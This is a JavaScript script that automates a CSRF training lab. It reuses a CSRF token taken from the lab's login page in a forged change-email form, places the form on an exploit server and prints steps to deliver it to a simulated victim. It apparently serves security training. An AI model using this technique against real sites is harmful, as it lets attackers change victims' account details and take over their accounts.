import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { Exploit } from "../utils/Exploit.js";
import { getFileContent } from "../../../utils/getFileContent.js";
import { runTasks } from "../../../utils/runTasks.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: CSRF where token is not tied to user session",
  allowProxy: true,
});

runTasks([task]);

async function task() {
  const exploit = await getExploit();
  const exploitServer = await ExploitServer.create(labUrl, httpClient);
  await exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

async function getExploit() {
  const rawExploitContent = await getFileContent(
    new URL("./exploit.html", import.meta.url),
  );
  const exploit = new Exploit(rawExploitContent);
  const actionUrl = labUrl + "my-account/change-email";
  const csrfToken = await getCsrfToken();
  exploit.setFormAction(actionUrl);
  exploit.setCsrfToken(csrfToken);
  return exploit.toString();
}

async function getCsrfToken() {
  const { data: html } = await httpClient.get(labUrl + "login");
  return extractCsrfToken(html);
}
